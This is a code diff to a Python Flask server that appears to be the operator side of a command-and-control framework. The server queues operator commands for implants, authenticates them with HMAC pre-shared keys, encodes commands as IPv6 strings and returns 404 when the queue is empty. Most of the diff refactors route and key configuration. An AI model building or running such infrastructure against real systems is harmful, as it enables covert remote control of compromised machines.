@@ -58,15 +58,38 @@ logging.basicConfig(
 with open('s_conf.json', 'r') as file:
     config = json.load(file)
 
-# Load the implant config file
-with open('../Implant/shared/config.json', 'r') as file:
-    imp_conf = json.load(file)
-
-listeners_list = config["listeners"]
-custom_listeners = config["custom_listeners"]
-
 # Then form a dict with the listener name and their enabled state
 route_status = {}
+
+def update_route_status (config_to_use, write_route_status, route_name):
+    """
+    Update the route_status dict with the routes from the config file
+    :param config_to_use: The json config file
+    :param write_route_status: The dict to write the route_status to
+    :param route_name: The name of the route
+    :return: nothing
+    """
+    logger.info("writing the route config to the route_status dict")
+    route_configs = config_to_use.get(route_name, [])  # Assume this returns a list
+    if not route_configs:
+        return  # No config for this method key, so we skip
+
+    for route_config in route_configs:
+        name = route_config['name']
+        path = route_config['path']
+        method = route_config['method']
+
+        if path not in write_route_status:
+            route_status[path] = {}
+        if name not in write_route_status[path]:
+            route_status[path][name] = {}
+
+        write_route_status[path][name][method] = {
+            'enabled': route_config['enabled'].lower() == "true",
+            'auth': route_config['auth'].lower() == "true",
+            'comp': route_config['comp'].lower() == "true"
+        }
+
 
 def get_routes():
     """
@@ -74,42 +97,20 @@ def get_routes():
     :return: nothing
     """
     logger.info("loading route config for enabled/disabled routes")
-    for listener in config["listeners"]:
-        name = listener['name']
-        path = listener['path']
-        method = listener['method']
-        # Ensure we only store the enabled/disabled status for each method on the same path
-        if path not in route_status:
-            route_status[path] = {}
-        if name not in route_status[path]:
-            route_status[path][name] = {}
-        # Store as true/false if the method for the route is enabled
-        # Gets the route enabled status, if auth is required, and if it's using compression
-        route_status[path][name][method] = {
-            'enabled': listener['enabled'].lower() == "true",
-            'auth': listener.get('auth', 'false').lower() == "true",  # Default to 'false' if 'auth' key is missing
-            'comp': listener.get('comp', 'false').lower() == "true"  # Same with 'comp'
-        }
-    print(route_status)
+    update_route_status(config, route_status, "default-GET")
+    update_route_status(config, route_status, "default-POST")
+    for listener in config["custom_listener"]:
+        for route_name, routes in listener.items():
+            for route in routes:
+                update_route_status(route, route_status, route_name)
 
-    for listener in config["custom_listeners"]:
-        name = listener['name']
-        path = listener['path']
-        method = listener['method']
-        # Ensure we only store the enabled/disabled status for each method on the same path
-        if path not in route_status:
-            route_status[path] = {}
-        if name not in route_status[path]:
-            route_status[path][name] = {}
-        route_status[path][name][method] = listener['enabled'].lower() == "true"  # Store as True or False
-        logger.info(route_status)
+    print(route_status)
 
 
 def register_blueprints(new_bp):
     """
     Dynamically registers any new Blueprints passed to the function by name.
     :param new_bp: The Blueprint name set in the decorator
-    :param url_route: The route to serve on
     :return: nothing
     """
     module = importlib.import_module(f'blueprints.{new_bp}')
@@ -131,7 +132,7 @@ def verify_auth_token(uri, received_token, received_timestamp):
     :return: bool depending on comparison outcome
     """
     # Get the value from the implant config json file
-    secret_key = imp_conf["psk2"]
+    secret_key = config["keys"][0]["psk2"]
     time_window = 60  # Allow a 60-second window for token validity
     # Ensure the timestamp is within the allowed time window
     current_time = int(time.time())
@@ -318,10 +319,10 @@ def get_waiting_command(implant_id):
             return operator, command
         except Empty:
             logger.info("empty queue found")
-            return False, False
+            return False, ""
     else:
         logger.info(f"No queue found for {implant_id}")
-        return False, False
+        return False, ""
 
 
 def get_unique_results_for_user(user_id):
@@ -506,14 +507,14 @@ def register_routes():
     If you want don't want to use them, set it to false
     """
 
-    @app.route(listeners_list[0]['path'], methods=['GET'])
+    @app.route("/", methods=['GET'])
     def def_endpoint1():
         """
         Verifies requests for commands with an HMAC and shared key
         :return: Either the waiting command or error
         """
         # The PSK used for the HMAC
-        imp_psk1 = imp_conf["psk1"]
+        imp_psk1 = config["keys"][0]["psk1"]
 
         base_uri = request.path.split("/")
         root_path = "/" + base_uri[1]
@@ -546,9 +547,9 @@ def register_routes():
             logger.info(get_imp_id[0])
 
             operator, command = get_waiting_command(get_imp_id[0])
-            if operator and command is False:
+            if operator is False:
                 logger.error("operator and command in queue returned as false")
-                return " "
+                abort(404)
             checkout_command(get_imp_id[0], operator, command)
             command = json.dumps(ipv6_encoder.string_to_ipv6(command))
             logger.info("sending command and HMAC to implant")
@@ -567,9 +568,9 @@ def register_routes():
             logger.info("got the token and timestamp from cookies")
             logger.info(f"info: {rcv_token}, {rcv_timestamp}, {get_imp_id}")
             operator, command = get_waiting_command(get_imp_id)
-            if operator and command is False:
+            if operator is False:
                 logger.error("operator and command in queue returned as false")
-                return "error"
+                abort(404)
             checkout_command(get_imp_id, operator, command)
             command = json.dumps(ipv6_encoder.string_to_ipv6(command))
             logger.info("sending command and HMAC to implant")
@@ -581,7 +582,7 @@ def register_routes():
             )
 
 
-    @app.route(listeners_list[1]['path'], methods=['POST'])
+    @app.route("/", methods=['POST'])
     def def_endpoint2():
         imp_id = request.cookies.get('id')
         if request.content_type == "application/json":
